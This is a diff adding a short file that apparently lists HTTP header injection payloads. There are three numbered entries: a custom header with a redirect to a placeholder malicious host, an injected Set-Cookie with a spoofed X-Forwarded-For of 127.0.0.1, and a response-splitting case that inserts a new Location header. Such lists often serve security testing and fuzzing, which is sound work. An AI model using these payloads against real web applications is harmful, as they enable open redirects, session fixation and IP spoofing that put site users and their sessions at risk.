@@ -1,0 +1,13 @@
+1. Add Custom Header and Redirect:
+X-Custom-Header: malicious_value
+Location: http://malicious-site.com
+
+2. Inject Multiple Headers (Redirect and Set Cookie):
+X-Forwarded-For: 127.0.0.1
+Set-Cookie: sessionid=malicious_value
+
+3. HTTP Response Splitting with a New Location Header:
+X-Redirect-Here: 
+Location: http://malicious-site.com
+
+
